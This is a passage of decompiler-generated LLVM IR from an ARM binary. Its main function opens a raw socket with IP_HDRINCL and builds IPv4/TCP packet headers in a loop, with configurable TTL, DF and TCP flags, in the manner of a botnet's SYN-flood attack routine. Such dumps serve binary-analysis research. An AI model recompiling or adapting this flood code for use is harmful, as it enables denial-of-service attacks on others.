  %v9_c6b0 = icmp eq i32 %v6_c094, %v1_c6b0
  store i1 %v9_c6b0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6b4 = load i32, i32* @r6, align 4
  %v2_c6b4 = add i32 %v1_c6b4, 4
  %v3_c6b4 = inttoptr i32 %v2_c6b4 to i32*
  store i32 %v0_c6a8, i32* %v3_c6b4, align 4
  br i1 %v9_c6b0, label %dec_label_pc_c6bc, label %dec_label_pc_c510

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c504
  %v0_c6bc = call i32 @function_fe60()
  store i32 %v1_c164, i32* %r3.global-to-local, align 4
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  %v1_c6c8 = load i32, i32* @r6, align 4
  %v2_c6c8 = add i32 %v1_c6c8, 8
  %v3_c6c8 = inttoptr i32 %v2_c6c8 to i32*
  store i32 %v0_c6bc, i32* %v3_c6c8, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c51c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c6bc
  %v0_c6d0 = load i32, i32* @r5, align 4
  %v1_c6d0 = add i32 %v0_c6d0, 40
  store i32 %v6_c13c, i32* @r1, align 4
  %v1_c6d8 = inttoptr i32 %v1_c6d0 to i8*
  %v2_c6d8 = call i32 @function_1003c(i8* %v1_c6d8)
  br label %dec_label_pc_c51c

dec_label_pc_c6e0:                                ; preds = %dec_label_pc_c1c4
  store i32 %v6_c13c, i32* %r3.global-to-local, align 4
  %v1_c6e8 = add i32 %v6_c13c, 40
  store i32 %v1_c6e8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c474.preheader

; uselistorder directives
  uselistorder i32 %v1_c6e8, { 1, 0 }
  uselistorder i32 %v4_c694, { 1, 0 }
  uselistorder i32 %v2_c624, { 1, 0 }
  uselistorder i32 %v3_c5f4, { 1, 0 }
  uselistorder i32 %v3_c5d0, { 2, 3, 1, 0 }
  uselistorder i32 %v0_c5b0, { 1, 2, 0 }
  uselistorder i32 %v1_c5ac, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c53c, { 1, 0, 2 }
  uselistorder i32 %v0_c480, { 2, 0, 1 }
  uselistorder i32 %v0_c474, { 1, 0 }
  uselistorder i1 %v2_c6c4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c648, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c45c, { 1, 0, 2, 3 }
  uselistorder i8 %v5_c2c0, { 1, 0 }
  uselistorder i32 %v1_c288, { 1, 0 }
  uselistorder i32 %v1_c284, { 1, 0 }
  uselistorder i32 %v1_c280, { 1, 0 }
  uselistorder i32 %v1_c25c, { 1, 0 }
  uselistorder i32 %v1_c258, { 1, 0 }
  uselistorder i32 %v1_c254, { 1, 0 }
  uselistorder i32 %v1_c248, { 1, 0 }
  uselistorder i32 %v1_c224, { 1, 0 }
  uselistorder i32 %v1_c214, { 1, 0 }
  uselistorder i32 %v1_c200, { 2, 1, 0 }
  uselistorder i32 %v0_c1e0, { 1, 0, 2 }
  uselistorder i32 %v3_c1d4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c1c8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_c1c4, { 0, 2, 1, 3 }
  uselistorder i1 %v7_c1bc, { 1, 0 }
  uselistorder i1 %v7_c190, { 1, 0 }
  uselistorder i32 %v3_c18c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_c178, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 %v1_c164, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_c13c, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_c094, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c078, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_c028, { 1, 0 }
  uselistorder i32 %v6_bfc0, { 1, 0 }
  uselistorder i32 %v2_bfa8, { 0, 3, 1, 2 }
  uselistorder i32 %v1_bf8c, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 39, 40, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 8, 9, 11, 10, 12, 13, 14, 15, 17, 16, 19, 18, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 7, 8, 9 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c5c8, { 1, 0 }
  uselistorder label %dec_label_pc_c51c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c474.preheader, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_c6fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c6fc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c6fc = load i32, i32* @r4, align 4
  %v12_c6fc = load i32, i32* @r7, align 4
  %v1_c700 = urem i32 %arg1, 256
  store i32 %v1_c700, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %v1_c700, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c718 = urem i32 %arg3, 256
  store i32 %v1_c718, i32* @r4, align 4
  %v2_c71c = call i32 @function_14254(i32 %v1_c700, i32 4)
  %v0_c720 = load i32, i32* @r5, align 4
  store i32 %v0_c720, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c71c, i32* %fp.global-to-local, align 4
  %v0_c730 = load i32, i32* @r4, align 4
  store i32 %v0_c730, i32* %r0.global-to-local, align 4
  %v4_c734 = inttoptr i32 %v0_c720 to i32*
  %v5_c734 = call i32 @function_a4e8(i32 %v0_c730, i32* %v4_c734, i32 2, i32 0)
  %v1_c740 = urem i32 %v5_c734, 256
  store i32 %v1_c740, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c74c = load i32, i32* @r5, align 4
  store i32 %v0_c74c, i32* %r1.global-to-local, align 4
  %v0_c750 = load i32, i32* @r4, align 4
  store i32 %v0_c750, i32* %r0.global-to-local, align 4
  %v5_c754 = trunc i32 %v5_c734 to i8
  %v6_c758 = inttoptr i32 %v0_c74c to i32*
  %v7_c758 = call i32 @function_a4e8(i32 %v0_c750, i32* %v6_c758, i32 3, i32 65535)
  %v0_c75c = load i32, i32* @r5, align 4
  store i32 %v0_c75c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c76c = load i32, i32* @r4, align 4
  store i32 %v0_c76c, i32* %r0.global-to-local, align 4
  %v5_c770 = inttoptr i32 %v0_c75c to i32*
  %v6_c770 = call i32 @function_a4e8(i32 %v0_c76c, i32* %v5_c770, i32 4, i32 64)
  %v1_c778 = urem i32 %v6_c770, 256
  store i32 %v1_c778, i32* %ip.global-to-local, align 4
  %v0_c77c = load i32, i32* @r5, align 4
  store i32 %v0_c77c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c788 = load i32, i32* @r4, align 4
  store i32 %v0_c788, i32* %r0.global-to-local, align 4
  %v6_c790 = inttoptr i32 %v0_c77c to i32*
  %v7_c790 = call i32 @function_a4e8(i32 %v0_c788, i32* %v6_c790, i32 5, i32 1)
  %v1_c79c = urem i32 %v7_c790, 256
  store i32 %v1_c79c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c7a8 = load i32, i32* @r5, align 4
  store i32 %v0_c7a8, i32* %r1.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r4, align 4
  store i32 %v0_c7ac, i32* %r0.global-to-local, align 4
  %v5_c7b4 = inttoptr i32 %v0_c7a8 to i32*
  %v6_c7b4 = call i32 @function_a4e8(i32 %v0_c7ac, i32* %v5_c7b4, i32 6, i32 65535)
  %v0_c7bc = load i32, i32* @r5, align 4
  store i32 %v0_c7bc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c7b4, i32* @r7, align 4
  %v0_c7cc = load i32, i32* @r4, align 4
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  %v4_c7d0 = inttoptr i32 %v0_c7bc to i32*
  %v5_c7d0 = call i32 @function_a4e8(i32 %v0_c7cc, i32* %v4_c7d0, i32 7, i32 65535)
  %v0_c7d8 = load i32, i32* @r5, align 4
  store i32 %v0_c7d8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c7d0, i32* @r6, align 4
  %v0_c7e8 = load i32, i32* @r4, align 4
  store i32 %v0_c7e8, i32* %r0.global-to-local, align 4
  %v4_c7ec = inttoptr i32 %v0_c7d8 to i32*
  %v5_c7ec = call i32 @function_a4e8(i32 %v0_c7e8, i32* %v4_c7ec, i32 17, i32 65535)
  %v0_c7f0 = load i32, i32* @r5, align 4
  store i32 %v0_c7f0, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c800 = load i32, i32* @r4, align 4
  store i32 %v0_c800, i32* %r0.global-to-local, align 4
  %v5_c804 = inttoptr i32 %v0_c7f0 to i32*
  %v6_c804 = call i32 @function_a4e8(i32 %v0_c800, i32* %v5_c804, i32 18, i32 0)
  %v0_c808 = load i32, i32* @r5, align 4
  store i32 %v0_c808, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c818 = load i32, i32* @r4, align 4
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  %v5_c81c = inttoptr i32 %v0_c808 to i32*
  %v6_c81c = call i32 @function_a4e8(i32 %v0_c818, i32* %v5_c81c, i32 11, i32 0)
  %v0_c820 = load i32, i32* @r5, align 4
  store i32 %v0_c820, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c830 = load i32, i32* @r4, align 4
  store i32 %v0_c830, i32* %r0.global-to-local, align 4
  %v5_c834 = inttoptr i32 %v0_c820 to i32*
  %v6_c834 = call i32 @function_a4e8(i32 %v0_c830, i32* %v5_c834, i32 12, i32 0)
  %v0_c838 = load i32, i32* @r5, align 4
  store i32 %v0_c838, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c848 = load i32, i32* @r4, align 4
  store i32 %v0_c848, i32* %r0.global-to-local, align 4
  %v5_c84c = inttoptr i32 %v0_c838 to i32*
  %v6_c84c = call i32 @function_a4e8(i32 %v0_c848, i32* %v5_c84c, i32 13, i32 0)
  %v0_c850 = load i32, i32* @r5, align 4
  store i32 %v0_c850, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c860 = load i32, i32* @r4, align 4
  store i32 %v0_c860, i32* %r0.global-to-local, align 4
  %v5_c864 = inttoptr i32 %v0_c850 to i32*
  %v6_c864 = call i32 @function_a4e8(i32 %v0_c860, i32* %v5_c864, i32 14, i32 0)
  %v0_c868 = load i32, i32* @r5, align 4
  store i32 %v0_c868, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c878 = load i32, i32* @r4, align 4
  store i32 %v0_c878, i32* %r0.global-to-local, align 4
  %v5_c87c = inttoptr i32 %v0_c868 to i32*
  %v6_c87c = call i32 @function_a4e8(i32 %v0_c878, i32* %v5_c87c, i32 15, i32 1)
  %v0_c880 = load i32, i32* @r5, align 4
  store i32 %v0_c880, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c890 = load i32, i32* @r4, align 4
  store i32 %v0_c890, i32* %r0.global-to-local, align 4
  %v5_c894 = inttoptr i32 %v0_c880 to i32*
  %v6_c894 = call i32 @function_a4e8(i32 %v0_c890, i32* %v5_c894, i32 16, i32 0)
  %v2_c8a0 = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_c8a0, i32* %r3.global-to-local, align 4
  %v0_c8a4 = load i32, i32* @r5, align 4
  store i32 %v0_c8a4, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c8ac = load i32, i32* @r4, align 4
  store i32 %v0_c8ac, i32* %r0.global-to-local, align 4
  %v5_c8b0 = inttoptr i32 %v0_c8a4 to i32*
  %v6_c8b0 = call i32 @function_a47c(i32 %v0_c8ac, i32* %v5_c8b0, i32 25, i32 %v2_c8a0, i32 %v6_c894)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c8c4 = call i32 @function_13f50(i32 2, i32 3, i32 6)
  store i32 %v3_c8c4, i32* %r0.global-to-local, align 4
  %v7_c8c8 = icmp eq i32 %v3_c8c4, -1
  store i1 %v7_c8c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c8c4, i32* %sb.global-to-local, align 4
  br i1 %v7_c8c8, label %dec_label_pc_ce34, label %dec_label_pc_c8d4

dec_label_pc_c8d4:                                ; preds = %dec_label_pc_c6fc
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c8dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c8dc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_c8f0 = call i32 @function_13f20(i32 %v3_c8c4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_c8f0, i32* %r0.global-to-local, align 4
  %v7_c8f4 = icmp eq i32 %v6_c8f0, -1
  store i1 %v7_c8f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c8f4, label %dec_label_pc_ce2c, label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8d4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_c910 = load i32, i32* @r7, align 4
  %v3_c910 = mul i32 %v0_c910, 65536
  store i32 %v3_c910, i32* %r4.global-to-local, align 4
  %v0_c914 = load i32, i32* @r6, align 4
  %v3_c918 = urem i32 %v7_c758, 65536
  store i32 %v3_c918, i32* %r3.global-to-local, align 4
  %v3_c91c = urem i32 %v0_c910, 65536
  store i32 %v3_c91c, i32* %ip.global-to-local, align 4
  %v3_c920 = urem i32 %v0_c914, 65536
  store i32 %v3_c920, i32* %r0.global-to-local, align 4
  %v1_c924 = urem i32 %v6_c81c, 256
  store i32 %v1_c924, i32* %r2.global-to-local, align 4
  %v0_c928 = load i32, i32* @sl, align 4
  %v2_c928 = icmp eq i32 %v0_c928, 0
  store i1 %v2_c928, i1* %cpsr_z.global-to-local, align 1
  %tmp69 = icmp slt i32 %v0_c928, 1
  br i1 %tmp69, label %dec_label_pc_cbd8, label %dec_label_pc_c940

dec_label_pc_c940:                                ; preds = %dec_label_pc_c8fc
  %v1_c950 = urem i32 %v0_c910, 256
  %v1_c958 = urem i32 %v7_c758, 256
  %v1_c95c = urem i32 %v0_c914, 256
  %tmp70 = mul i32 %v5_c7ec, 256
  %v3_c964 = mul nuw nsw i32 %v1_c95c, 256
  %v1_c968 = and i32 %tmp70, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp71 = udiv i32 %v0_c914, 256
  %v4_c96c = urem i32 %tmp71, 256
  %v5_c96c = or i32 %v4_c96c, %v3_c964
  store i32 %v5_c96c, i32* @r6, align 4
  %tmp72 = udiv i32 %v5_c7ec, 256
  %v4_c970 = urem i32 %tmp72, 256
  %v5_c970 = or i32 %v4_c970, %v1_c968
  store i32 %v5_c970, i32* @r5, align 4
  %v3_c97c = mul nuw nsw i32 %v1_c958, 256
  %v1_c980 = urem i32 %v6_c81c, 2
  %tmp73 = udiv i32 %v7_c758, 256
  %v4_c984 = urem i32 %tmp73, 256
  %v5_c984 = or i32 %v4_c984, %v3_c97c
  store i32 %v5_c984, i32* @lr, align 4
  %v1_c988 = urem i32 %v6_c834, 2
  %v3_c998 = mul nuw nsw i32 %v1_c950, 256
  store i32 %v3_c998, i32* %r1.global-to-local, align 4
  %tmp74 = udiv i32 %v0_c910, 256
  %v4_c9a4 = urem i32 %tmp74, 256
  %v5_c9a4 = or i32 %v4_c9a4, %v3_c998
  store i32 %v5_c9a4, i32* @r7, align 4
  %v1_c9a8 = urem i32 %v6_c84c, 2
  %v1_c9ac = urem i32 %v6_c864, 2
  %v1_c9b0 = urem i32 %v6_c87c, 2
  %v1_c9c0 = urem i32 %v6_c894, 2
  store i32 %v1_c9c0, i32* %r0.global-to-local, align 4
  store i32 %v1_c958, i32* %r2.global-to-local, align 4
  store i32 %v1_c950, i32* %r3.global-to-local, align 4
  store i32 %v1_c95c, i32* %ip.global-to-local, align 4
  %v5_c9d0 = trunc i32 %tmp73 to i8
  %v5_c9e0 = trunc i32 %v0_c914 to i8
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_c770, 16777216
  %v4_ca30 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v7_c758, 16777216
  %v4_ca48 = sdiv i32 %sext8, 16777216
  %tmp = sub nsw i32 0, %v1_c980
  %v4_caa4 = and i32 %tmp, 32
  %tmp78 = sub nsw i32 0, %v1_c988
  %v4_cab8 = and i32 %tmp78, 16
  %tmp79 = sub nsw i32 0, %v1_c9a8
  %v4_cacc = and i32 %tmp79, 8
  %tmp80 = sub nsw i32 0, %v1_c9ac
  %v4_cae0 = and i32 %tmp80, 4
  %tmp81 = sub nsw i32 0, %v1_c9b0
  %v3_caf4 = and i32 %tmp81, 2
  %v7_cb24 = sext i8 %v5_c9e0 to i32
  %sext77 = mul i32 %v0_c910, 16777216
  %v3_cb24 = sdiv i32 %sext77, 16777216
  br label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %bb76, %dec_label_pc_c940
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c9f0 = call i32 @function_14254(i32 128, i32 1)
  store i32 %v2_c9f0, i32* %r0.global-to-local, align 4
  %v3_c9f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c9f4, i32* %r2.global-to-local, align 4
  %v1_c9f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_c9f8 = load i32, i32* @r4, align 4
  %v5_c9f8 = mul i32 %v2_c9f8, 4
  %v6_c9f8 = add i32 %v5_c9f8, %v1_c9f8
  %v7_c9f8 = inttoptr i32 %v6_c9f8 to i32*
  store i32 %v2_c9f0, i32* %v7_c9f8, align 4
  %v0_c9fc = load i32, i32* %fp.global-to-local, align 4
  %v1_c9fc = load i32, i32* %r2.global-to-local, align 4
  %v4_c9fc = mul i32 %v1_c9fc, 4
  %v5_c9fc = add i32 %v4_c9fc, %v0_c9fc
  %v6_c9fc = inttoptr i32 %v5_c9fc to i32*
  %v7_c9fc = load i32, i32* %v6_c9fc, align 4
  store i32 %v7_c9fc, i32* %r4.global-to-local, align 4
  %v1_ca00 = inttoptr i32 %v7_c9fc to i8*
  %v2_ca00 = load i8, i8* %v1_ca00, align 1
  %tmp82 = urem i8 %v2_ca00, 16
  %v1_ca04 = zext i8 %tmp82 to i32
  %v1_ca08 = or i32 %v1_ca04, 64
  store i32 %v1_ca08, i32* %r3.global-to-local, align 4
  %v1_ca0c = trunc i32 %v1_ca08 to i8
  store i8 %v1_ca0c, i8* %v1_ca00, align 1
  %v0_ca10 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca10 = inttoptr i32 %v0_ca10 to i8*
  %v2_ca10 = load i8, i8* %v1_ca10, align 1
  %v1_ca14 = and i8 %v2_ca10, -16
  %v1_ca18 = or i8 %v1_ca14, 5
  store i32 %v1_c79c, i32* %r0.global-to-local, align 4
  store i8 %v1_ca18, i8* %v1_ca10, align 1
  %v2_ca28 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca28 = add i32 %v2_ca28, 1
  %v4_ca28 = inttoptr i32 %v3_ca28 to i8*
  store i8 %v5_c754, i8* %v4_ca28, align 1
  store i32 %v4_ca30, i32* %r2.global-to-local, align 4
  %v2_ca34 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca34 = add i32 %v2_ca34, 4
  %v4_ca34 = inttoptr i32 %v3_ca34 to i8*
  store i8 %v5_c9d0, i8* %v4_ca34, align 1
  store i32 6, i32* %ip.global-to-local, align 4
  %v0_ca40 = load i32, i32* %r0.global-to-local, align 4
  %v2_ca40 = icmp eq i32 %v0_ca40, 0
  store i1 %v2_ca40, i1* %cpsr_z.global-to-local, align 1
  %v2_ca44 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca44 = add i32 %v2_ca44, 3
  %v4_ca44 = inttoptr i32 %v3_ca44 to i8*
  store i8 60, i8* %v4_ca44, align 1
  store i32 %v4_ca48, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ca50 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca50 = trunc i32 %v0_ca50 to i8
  %v2_ca50 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca50 = add i32 %v2_ca50, 8
  %v4_ca50 = inttoptr i32 %v3_ca50 to i8*
  store i8 %v1_ca50, i8* %v4_ca50, align 1
  %v0_ca54 = load i32, i32* %ip.global-to-local, align 4
  %v1_ca54 = trunc i32 %v0_ca54 to i8
  %v2_ca54 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca54 = add i32 %v2_ca54, 9
  %v4_ca54 = inttoptr i32 %v3_ca54 to i8*
  store i8 %v1_ca54, i8* %v4_ca54, align 1
  %v0_ca58 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca58 = trunc i32 %v0_ca58 to i8
  %v2_ca58 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca58 = add i32 %v2_ca58, 2
  %v4_ca58 = inttoptr i32 %v3_ca58 to i8*
  store i8 %v1_ca58, i8* %v4_ca58, align 1
  %v3_ca5c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ca5c, i32* %r2.global-to-local, align 4
  %v0_ca60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca60, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c9e8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_ca64 = load i32, i32* %r4.global-to-local, align 4
  %v4_ca64 = add i32 %v3_ca64, 6
  %v5_ca64 = inttoptr i32 %v4_ca64 to i8*
  store i8 64, i8* %v5_ca64, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c9e8, %bb
  %v0_ca68 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca68 = trunc i32 %v0_ca68 to i8
  %v2_ca68 = load i32, i32* %r4.global-to-local, align 4
  %v3_ca68 = add i32 %v2_ca68, 5
  %v4_ca68 = inttoptr i32 %v3_ca68 to i8*
  store i8 %v1_ca68, i8* %v4_ca68, align 1
  %v0_ca6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca6c, label %.thread9, label %bb75

.thread9:                                         ; preds = %.thread
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  br label %bb76

bb75:                                             ; preds = %.thread
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  %v3_ca74 = load i32, i32* %r4.global-to-local, align 4
  %v4_ca74 = add i32 %v3_ca74, 7
  %v5_ca74 = inttoptr i32 %v4_ca74 to i8*
  store i8 0, i8* %v5_ca74, align 1
  %v0_ca7c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb76

bb76:                                             ; preds = %.thread9, %bb75
  %v0_ca7c = phi i32 [ %v6_c8b0, %.thread9 ], [ %v0_ca7c.pre, %bb75 ]
  %v0_ca78 = load i32, i32* %r2.global-to-local, align 4
  %v3_ca78 = mul i32 %v0_ca78, 32
  store i32 %v3_ca78, i32* %r3.global-to-local, align 4
  %v1_ca7c = load i32, i32* %r4.global-to-local, align 4
  %v2_ca7c = add i32 %v1_ca7c, 12
  %v3_ca7c = inttoptr i32 %v2_ca7c to i32*
  store i32 %v0_ca7c, i32* %v3_ca7c, align 4
  %v0_ca80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca80 = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_ca80, -8
  %v5_ca80 = add i32 %v0_ca80, %tmp83
  %v1_ca84 = load i32, i32* @r8, align 4
  %v2_ca84 = add i32 %v1_ca84, %v5_ca80
  store i32 %v2_ca84, i32* %r3.global-to-local, align 4
  %v1_ca88 = add i32 %v2_ca84, 16
  %v2_ca88 = inttoptr i32 %v1_ca88 to i32*
  %v3_ca88 = load i32, i32* %v2_ca88, align 4
  store i32 %v3_ca88, i32* %r2.global-to-local, align 4
  %v0_ca8c = load i32, i32* @r7, align 4
  %v1_ca8c = trunc i32 %v0_ca8c to i8
  %v2_ca8c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca8c = add i32 %v2_ca8c, 20
  %v4_ca8c = inttoptr i32 %v3_ca8c to i8*
  store i8 %v1_ca8c, i8* %v4_ca8c, align 1
  %v0_ca90 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca90 = load i32, i32* %r4.global-to-local, align 4
  %v2_ca90 = add i32 %v1_ca90, 16
  %v3_ca90 = inttoptr i32 %v2_ca90 to i32*
  store i32 %v0_ca90, i32* %v3_ca90, align 4
  %v0_ca94 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca94 = add i32 %v0_ca94, 20
  store i32 %v1_ca94, i32* %r1.global-to-local, align 4
  %v1_ca98 = add i32 %v0_ca94, 33
  %v2_ca98 = inttoptr i32 %v1_ca98 to i8*
  %v3_ca98 = load i8, i8* %v2_ca98, align 1
  %v4_ca98 = zext i8 %v3_ca98 to i32
  store i32 %v1_c980, i32* %r2.global-to-local, align 4
  %v1_caa0 = and i32 %v4_ca98, 223
  %v5_caa4 = or i32 %v1_caa0, %v4_caa4
  store i32 %v5_caa4, i32* %r3.global-to-local, align 4
  %v1_caa8 = trunc i32 %v5_caa4 to i8
  store i8 %v1_caa8, i8* %v2_ca98, align 1
  %v0_caac = load i32, i32* %r1.global-to-local, align 4
  %v1_caac = add i32 %v0_caac, 13
  %v2_caac = inttoptr i32 %v1_caac to i8*
  %v3_caac = load i8, i8* %v2_caac, align 1
  %v4_caac = zext i8 %v3_caac to i32
  store i32 %v1_c988, i32* %r3.global-to-local, align 4
  %v1_cab4 = and i32 %v4_caac, 239
  %v5_cab8 = or i32 %v1_cab4, %v4_cab8
  store i32 %v5_cab8, i32* %r2.global-to-local, align 4
  %v1_cabc = trunc i32 %v5_cab8 to i8
  store i8 %v1_cabc, i8* %v2_caac, align 1
  %v0_cac0 = load i32, i32* %r1.global-to-local, align 4
  %v1_cac0 = add i32 %v0_cac0, 13
  %v2_cac0 = inttoptr i32 %v1_cac0 to i8*
  %v3_cac0 = load i8, i8* %v2_cac0, align 1
  %v4_cac0 = zext i8 %v3_cac0 to i32
  store i32 %v1_c9a8, i32* %ip.global-to-local, align 4
  %v1_cac8 = and i32 %v4_cac0, 247
  %v5_cacc = or i32 %v1_cac8, %v4_cacc
